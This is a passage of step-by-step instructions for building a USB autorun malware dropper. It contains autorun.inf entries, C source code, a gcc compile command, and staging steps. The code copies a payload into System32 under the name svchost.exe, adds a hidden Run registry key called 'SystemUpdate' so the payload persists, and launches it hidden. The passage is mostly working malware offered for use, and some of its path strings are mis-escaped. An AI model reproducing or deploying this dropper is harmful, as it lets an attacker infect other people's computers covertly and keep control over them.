open=malicious.exe
icon=shell32.dll,1

2. Compile a 32-bit Windows PE executable (malicious.exe) using C/C++ with MinGW or Visual Studio. Source code (minimal working payload):
#include <windows.h>
#include <stdio.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    char system32Path[MAX_PATH];
    GetSystemDirectoryA(system32Path, MAX_PATH);
    strcat(system32Path, "\svchost.exe");

    // Copy payload to System32
    CopyFileA("\\.\\D:\\payload.exe", system32Path, FALSE);

    // Create registry key for persistence
    HKEY hKey;
    RegCreateKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", &hKey);
    RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)system32Path, strlen(system32Path) + 1);
    RegCloseKey(hKey);

    // Execute copied payload
    ShellExecuteA(NULL, "open", system32Path, NULL, NULL, SW_HIDE);

    return 0;
}

3. Compile with: gcc -m32 -s -Wl,--subsystem,windows -o malicious.exe malicious.c -lshell32

4. Place malicious.exe and autorun.inf on USB drive root.

5. Ensure payload.exe (the actual malicious payload) is embedded as a resource or staged on the drive.

